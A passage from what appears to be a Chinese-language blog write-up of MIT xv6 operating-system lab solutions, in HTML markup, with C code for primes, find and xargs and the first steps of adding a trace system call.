class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *left_fd)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(left_fd[WRITE]);<br>    <span class="hljs-keyword">int</span> prime,i;<br>    read(left_fd[READ],&amp;prime,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//第一个数字必定是素数</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prime %d\n&quot;</span>,prime);<span class="hljs-comment">//符合格式的输出</span><br>    <br>    <span class="hljs-keyword">if</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">int</span> right_fd[<span class="hljs-number">2</span>];<br>        pipe(right_fd);<br>        <span class="hljs-keyword">int</span> pid=fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            foo(right_fd);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)<br>        &#123;<br>            close(right_fd[READ]);<br>            <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<span class="hljs-comment">//注意已经读取了一个i，这里要判断一下</span><br>            &#123;<br>                write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>            &#125;<br>            <span class="hljs-keyword">while</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<br>                &#123;<br>                    write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>                &#125;<br>            &#125;<br>            close(right_fd[WRITE]);<br>            close(left_fd[READ]);<br>            wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//父进程要等待子进程</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> left_fd[<span class="hljs-number">2</span>];<br>    pipe(left_fd);<br>    <br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<span class="hljs-comment">//child</span><br>    &#123;<br>        foo(left_fd);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        close(left_fd[READ]);<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">35</span>;i++)<span class="hljs-comment">//第一轮，把2~35全都传递给右边</span><br>        &#123;<br>            write(left_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>        &#125;<br>        close(left_fd[WRITE]);<br>        wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//主要的素数进程应该只有在所有的输出都打印出来之后，并且在所有其他的素数进程都退出之后才能退出</span><br>    &#125;<br>    <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>Write a simple version of the UNIX find program: find all the files in a directory tree whose name matches a string. Your solution should be in the file <code>user/find.c</code>.</p><ul><li>功能：查找目录树中名称与字符串匹配的所有文件</li><li>可以参考user/ls.c 以了解如何读取目录</li><li>避开<code>.</code>和<code>..</code>的递归</li></ul><p>思路：</p><p>打开目录，使用while循环得到目录下所有文件/子目录的dirent结构体de</p><ul><li>如果是de.name是.或者..，那么直接continue跳过</li><li>如果使用字符串拼接获取文件的相对路径buf<ul><li>如果buf的st类型是文件类型，且文件名字和我们需要搜索的文件名字相同，那么就直接输出文件信息，这就是我们要找的文件</li><li>如果buf的st类型是目录，且不为空，那么就继续递归搜索下去</li></ul></li></ul><blockquote><p>涉及到read、fstat等函数的使用</p><p>涉及到dirent、stat结构体的使用</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * path,<span class="hljs-keyword">char</span> *file)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>], *p;<br><br>    <span class="hljs-keyword">if</span>((fd = open(path, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//打开目录，获得对应的文件描述符</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot open %s\n&quot;</span>, path);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, path);<br>        close(fd);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de))<span class="hljs-comment">//使用while循环得到目录下所有文件/子目录的dirent结构体de</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;.&quot;</span>)==<span class="hljs-number">0</span>||<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;..&quot;</span>)==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//跳过</span><br>        <br>        <span class="hljs-built_in">strcpy</span>(buf, path);<br>        p = buf+<span class="hljs-built_in">strlen</span>(buf);<br>        *p++ = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">char</span> *pp=de.name;<br>        <span class="hljs-keyword">while</span>(*pp!=<span class="hljs-number">0</span>) <span class="hljs-comment">//字符串拼接</span><br>        &#123;<br>            *p++ =*pp++;<br>        &#125;<br>        *p=<span class="hljs-number">0</span>;<span class="hljs-comment">//别忘了加终止符</span><br>        <br>        <span class="hljs-keyword">if</span>(stat(buf, &amp;st) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//获取buf的st</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(st.type==T_FILE)<span class="hljs-comment">//如果buf的st类型是文件类型</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,file)==<span class="hljs-number">0</span>)<span class="hljs-comment">//如果文件名字和我们需要搜索的文件名字相同，那么就直接输出文件信息</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(st.type==T_DIR)<span class="hljs-comment">//如果buf的st类型是目录类型</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) <span class="hljs-comment">//目录下没有文件，如果缺少这个语句xargs命令将会报错</span><br>    <span class="hljs-keyword">continue</span>;<br>            find(buf,file);<span class="hljs-comment">//递归，继续搜索</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * path=argv[<span class="hljs-number">1</span>];<span class="hljs-comment">//查找目录</span><br>    <span class="hljs-keyword">char</span> * file=argv[<span class="hljs-number">2</span>];<span class="hljs-comment">//查找文件</span><br><br>    find(path,file);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><p>Write a simple version of the UNIX xargs program: read lines from the standard input and run a command for each line, supplying the line as arguments to the command. Your solution should be in the file <code>user/xargs.c</code>.</p><ul><li>对于管道连接的命令，以<code>find . b | xargs grep hello</code>为例，argv[0]是 xargs，argv[1]是grep，一共有三个参数，如果想要读取find . b，那么需要从标准输入中读取，也即是使用read函数读取fd为0时的数据</li><li>每一次读取一行，将该行所有空格替换为\0，这样命令就可以被分割。然后将argv[]指向这些命令。如果遇到换行符，执行fork，父进程等待子进程结束</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN 0</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> *Argv[MAXARG];<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=argc<span class="hljs-number">-1</span>;i++)<br>    &#123;<br>        Argv[i<span class="hljs-number">-1</span>]=argv[i];<span class="hljs-comment">//ignore xargs(argv[0])</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        index=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">char</span> *p=buf;<br>        i=argc<span class="hljs-number">-1</span>;<span class="hljs-comment">//注意i要写在这里</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> num=read(STDIN,&amp;c,<span class="hljs-number">1</span>);<span class="hljs-comment">//读取标准输入,注意是&amp;c</span><br>            <span class="hljs-keyword">if</span>(num!=<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//程序的终止条件</span><br>            <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27; &#x27;</span>||c==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            &#123;<br>                buf[index++]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>                Argv[i++]=p;<span class="hljs-comment">//参数</span><br>                p=&amp;buf[index];<span class="hljs-comment">//更新参数首地址</span><br>                <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27;\n&#x27;</span>) <br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//character </span><br>            &#123;<br>                buf[index++]=c;<br>            &#125;<br>        &#125;<br>        Argv[i]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> pid = fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            exec(Argv[<span class="hljs-number">0</span>],Argv);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            wait(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230301002218.png"></p><h1 id="Lab2-syscall-System-calls"><a href="#Lab2-syscall-System-calls" class="headerlink" title="Lab2 syscall System calls"></a>Lab2 syscall System calls</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote><p>建议听课+熟读xv6手册，并理解清楚lab要求</p></blockquote><p>先切换到syscall分支，并在sh.c中加入代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做是为了防止报递归错</p><p>这个实验要求我们添加两个系统调用，所以我们需要先搞清楚riscv架构的系统调用流程</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E6%88%AA%E5%9B%BE20230302004808.png"></p><p>用户执行trace命令 - &gt; ecall <code>&lt;SYS_trace&gt;</code>  - &gt; 触发trap - &gt; 调用sys_trace</p><p>来自用户空间的系统调用、中断、异常都可以引发trap，来自用户空间的trap的处理路径是：</p><ul><li>uservec(kernel/trampoline.S:16)</li><li>usertrap(kernel/trap.c:37)</li><li>usertrapret(kernel/trap.c:90) 返回时</li><li>userret(kernel/trampoline.S:16)</li></ul><p>详细的内容见xv6文档</p><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><p>为了添加trace系统调用，我们需要：</p><ul><li>在Makefile中添加$U/_trace，这样的话就可以编译出可执行文件，从而在用户命令行中调用trace命令</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_trace<br></code></pre></td></tr></table></figure><ul><li>将trace系统调用的原型添加到 <code>user/user.h</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">trace</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>trace的stub添加到 <code>user/usys.pl</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">entry(<span class="hljs-string">&quot;trace&quot;</span>);<br></code></pre></td></tr></table></figure><p>usys.pl文件会生成<em>usys.S</em>文件，形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/syscall.h&quot;</span></span><br>.global trace<br>trace:<br> li a7, SYS_trace<br> ecall<br> ret<br></code></pre></td></tr></table></figure><ul><li>在syscall.h中添加trace的系统调用号</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_trace  22</span><br></code></pre></td></tr></table></figure><ul><li>在syscall.c中添加</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>.....<br><br>[SYS_trace]   sys_trace,<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在proc.h的proc结构体中添加字段mask</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>在sysproc.c中添加sys_trace，照猫画虎，可以参考fork的实现。其中argint获取trace的参数，也即是mask。将当前进程的mask字段设置为要追踪的参数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> mask;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;mask) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//获取trace的参数：mask</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>myproc()-&gt;mask=mask;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>修改 fork ()(参见 kernel/proc.c) ，跟踪掩码从父进程复制到子进程</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; 